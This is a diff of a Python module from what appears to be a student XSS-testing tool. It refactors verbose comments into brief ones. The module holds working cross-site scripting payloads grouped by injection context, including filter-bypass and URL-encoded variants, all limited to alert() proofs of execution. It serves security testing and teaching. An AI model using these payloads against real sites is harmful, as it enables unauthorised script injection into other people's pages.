@@ -1,151 +1,51 @@
 """
-payload_bank.py
-Owner: Member 1 (Payload Bank Lead)
-
-Holds the CURATED BASE XSS payloads, organized by injection context.
-This is the "data foundation" the rest of the tool builds on:
-- cli.py picks a context + calls get_payloads() to fetch this raw list
-- mutators.py then applies encoding/evasion ON TOP of these base payloads
-
-So the payloads here are deliberately NOT encoded yet - that's Member 2's
-job. This file's job is just: "if the attacker can inject text into THIS
-context, what are the different raw ways to get a <script> or event
-handler to actually execute?"
-
-Contexts covered (per assignment brief):
-- html_body   : payload lands directly inside the page's HTML body
-- attribute   : payload lands inside an HTML tag attribute value
-- js_string   : payload lands inside a JavaScript string literal
-- url_param   : payload lands in a URL query parameter reflected into the page
-
-All payloads use alert('XSS-test') as a harmless, local-only proof of
-execution - nothing here exfiltrates data or contacts an external server.
+payload_bank.py - Store a baseline list of XSS payloads by context.
+All payloads remain raw (not encoded yet), as mutators.py will handle encoding later.
 """
 
 PAYLOADS = {
-    # ------------------------------------------------------------------
-    # CONTEXT 1: html_body
-    # Payload is reflected directly as HTML content, e.g.:
-    #   <div>Welcome, HERE</div>
-    # ------------------------------------------------------------------
+    # Injected directly into the HTML body (e.g., <div>HERE</div>)
     "html_body": [
-        # Classic - straight <script> tag. Will be blocked by almost
-        # any real filter, but it's the baseline every bypass is
-        # measured against.
-        "<script>alert('XSS-test')</script>",
-
-        # No <script> tag at all - uses an <img> with a broken src so
-        # onerror fires. Useful because some filters only blacklist
-        # the literal word "script".
-        "<img src=x onerror=alert('XSS-test')>",
-
-        # Similar idea but with <svg>, which some filters forget to
-        # blacklist because they're focused on <script>/<img>.
-        "<svg onload=alert('XSS-test')>",
-
-        # Self-triggering iframe - no event needed, srcdoc executes
-        # inline HTML (including its own <script>) immediately.
+        "<script>alert('XSS-test')</script>",  # basic
+        "<img src=x onerror=alert('XSS-test')>",  # use img onerror if script tag is blocked
+        "<svg onload=alert('XSS-test')>",  # use svg onload
         "<iframe srcdoc=\"<script>alert('XSS-test')</script>\">",
-
-        # javascript: pseudo-protocol inside an iframe's src attribute -
-        # found this during testing against OWASP Juice Shop's "DOM XSS"
-        # challenge, which specifically checks for this exact pattern.
-        "<iframe src=\"javascript:alert(`xss`)\">",
+        "<iframe src=\"javascript:alert(`xss`)\">",  # test on OWASP Juice Shop (DOM XSS)
     ],
 
-    # ------------------------------------------------------------------
-    # CONTEXT 2: attribute
-    # Payload is reflected inside a tag attribute value, e.g.:
-    #   <input type="text" value="HERE">
-    # ------------------------------------------------------------------
+    # Injected inside an HTML attribute (e.g., <input value="HERE">)
     "attribute": [
-        # Breaks OUT of the attribute's double quotes, closes the tag,
-        # then injects a fresh <script> tag after it.
-        "\"><script>alert('XSS-test')</script>",
-
-        # Doesn't even need to escape the tag - just adds a brand new
-        # event-handler attribute onto the SAME tag. Works even if the
-        # filter strips angle brackets, since there are none here.
-        "\" onmouseover=\"alert('XSS-test')",
-
-        # Same idea, but for sites that use single quotes instead of
-        # double quotes for attribute values.
-        "' onfocus='alert(\"XSS-test\")' autofocus='",
-
-        # Doesn't break out of the quotes at all - relies on the
-        # attribute being something the browser executes directly,
-        # like an href using the javascript: pseudo-protocol.
-        "javascript:alert('XSS-test')",
+        "\"><script>alert('XSS-test')</script>",  # close the tag first before injecting script
+        "\" onmouseover=\"alert('XSS-test')",  # add event handler without using angle brackets
+        "' onfocus='alert(\"XSS-test\")' autofocus='",  # for attributes using single quotes
+        "javascript:alert('XSS-test')",  # for attributes like href or src
     ],
 
-    # ------------------------------------------------------------------
-    # CONTEXT 3: js_string
-    # Payload is reflected inside an existing JS string literal, e.g.:
-    #   var username = "HERE";
-    # ------------------------------------------------------------------
+    # Injected inside a JS string (e.g., var user = "HERE";)
     "js_string": [
-        # Closes the double-quoted string, runs alert(), then comments
-        # out whatever code was originally after it on that line.
-        "\";alert('XSS-test');//",
-
-        # Same idea for single-quoted JS strings.
-        "';alert('XSS-test');//",
-
-        # Doesn't close the string at all - just concatenates onto it
-        # using JS string concatenation, in case semicolons/quotes are
-        # being filtered but "+" slips through.
-        "\"+alert('XSS-test')+\"",
-
-        # Template literal breakout, for apps that build strings with
-        # backticks: `Hello ${name}` style reflected input.
-        "${alert('XSS-test')}",
+        "\";alert('XSS-test');//",  # close double quote & comment out remaining code
+        "';alert('XSS-test');//",  # close single quote
+        "\"+alert('XSS-test')+\"",  # concatenate string using + operator
+        "${alert('XSS-test')}",  # for template literals (backticks)
     ],
 
-    # ------------------------------------------------------------------
-    # CONTEXT 4: url_param
-    # Payload is placed in a URL query parameter that the server
-    # reflects back into the page, e.g.:
-    #   https://example.com/search?q=HERE
-    # ------------------------------------------------------------------
+    # Passed via URL parameter (e.g., /search?q=HERE)
     "url_param": [
-        # Plain payload - works if the app reflects the param straight
-        # into HTML with zero encoding.
-        "<script>alert('XSS-test')</script>",
-
-        # URL-encoded version - needed when the app (or a WAF in front
-        # of it) decodes %XX sequences before the filter check runs,
-        # but blocks raw "<script>" in the request itself.
-        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",
-
-        # Double URL-encoded - for cases where the request passes
-        # through two decode steps (e.g. a proxy AND the app), so a
-        # single encoding gets fully decoded too early and gets caught.
-        "%253Cscript%253Ealert('XSS-test')%253C/script%253E",
-
-        # img/onerror variant in URL form, for apps that strip the
-        # word "script" specifically from query parameters.
-        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS-test')%3E",
+        "<script>alert('XSS-test')</script>",  # raw
+        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",  # URL encoded
+        "%253Cscript%253Ealert('XSS-test')%253C/script%253E",  # double URL encoded
+        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS-test')%3E",  # encoded img onerror version
     ],
 }
 
 
 def get_payloads(context: str):
-    """
-    Return the list of base payloads for a given injection context.
-    Raises a clear error if the context doesn't exist yet, instead
-    of silently returning nothing (helps whoever's debugging cli.py).
-    """
+    """Get the payload list for the selected context."""
     if context not in PAYLOADS:
-        raise ValueError(
-            f"Unknown context '{context}'. "
-            f"Available contexts so far: {list(PAYLOADS.keys())}"
-        )
+        raise ValueError(f"Unknown context '{context}'. Available: {list(PAYLOADS.keys())}")
     return PAYLOADS[context]
 
 
 def list_contexts():
-    """
-    Return all currently available contexts. Useful for cli.py
-    when building a --context flag with argparse choices=...
-    """
+    """Return all available context names for CLI usage."""
     return list(PAYLOADS.keys())
